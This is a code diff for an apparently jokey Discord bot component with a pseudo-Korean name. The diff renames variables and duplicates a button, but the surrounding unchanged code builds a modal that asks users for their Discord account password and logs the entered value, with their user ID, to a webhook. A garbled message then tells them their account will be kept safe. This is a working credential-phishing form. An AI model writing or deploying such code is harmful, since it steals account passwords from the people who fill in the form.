@@ -13,22 +13,21 @@ setTweaks(self);
 
 
 export function 빠빱윈또우뻐뜬() {
-	const [popupPassword, popupPassword_value] = useInput();
-	const popupWindow = useModal((interaction, env) => {
+	const [popupPassword_id, popupPassword_value] = useInput();
+	const popupWindow_id = useModal((interaction, env) => {
 		const Logger = new WebLogger(env.LOGHOOK_ID, env.LOGHOOK_TOKEN);
 		Logger.log(`<@${interaction.member.user.id}> | 빠빱\\_윈또우\\_뻐뜬 > \`\`${escapers.backtick(popupPassword_value)}\`\``);
 		return (
 			<Message ephemeral>{`<@${interaction.member.user.id}>`}, 매우 즐거운 귀하의 계정! 당국이 계정을 안전하게 보호할 것이다 입니다.</Message>
 		);
 	});
-	const popupWindowButton = useButton(() => (
-		<Modal id={popupWindow} title="이것은 빠빱_윈또우 이다">
+	const popupWindowButton_id = useButton(() => (
+		<Modal id={popupWindow_id} title="이것은 빠빱_윈또우 이다">
 			<Input
-				id={popupPassword}
+				id={popupPassword_id}
 				label="Discord 계정 비밀번호를 입력해주세요"
 				required
-			>
-			</Input>
+			/>
 		</Modal>
 	));
 	
@@ -36,7 +35,8 @@ export function 빠빱윈또우뻐뜬() {
 		<Message>
 			빠빱\_윈또우\_뻐뜬
 			<Row>
-				<Button id={popupWindowButton} primary>popup_window_button</Button>
+				<Button id={popupWindowButton_id} primary>popup_window_button</Button>
+				<Button id={popupWindowButton_id} primary>popup_window_button</Button>
 			</Row>
 		</Message>
 	);
